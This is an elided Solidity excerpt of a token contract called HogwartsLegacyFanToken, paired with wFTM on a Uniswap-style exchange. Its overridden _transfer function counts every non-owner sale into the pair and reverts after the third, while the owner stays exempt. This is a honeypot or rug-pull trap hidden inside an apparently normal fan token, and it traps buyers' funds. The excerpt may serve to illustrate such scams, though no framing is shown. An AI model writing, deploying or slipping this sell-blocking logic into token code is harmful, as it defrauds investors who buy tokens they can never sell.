...
contract HogwartsLegacyFanToken is ERC20, Ownable {

  address private immutable wftm = 0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83;
  address private immutable pair;
  uint private spellThreshold;

  constructor(address uniswapFactory) ERC20("HogwartsLegacyFanToken", "HLFT") {
    pair = IUniswapV2Factory(uniswapFactory).createPair(wftm, address(this));
  ...
  function _transfer(address from, address to, uint256 amount) internal virtual override {
    if(to == pair && from != owner()){
      spellThreshold += 1;
      require(spellThreshold <= 3, "PETRIFICUS_TOTALUS: Wait a little bit");
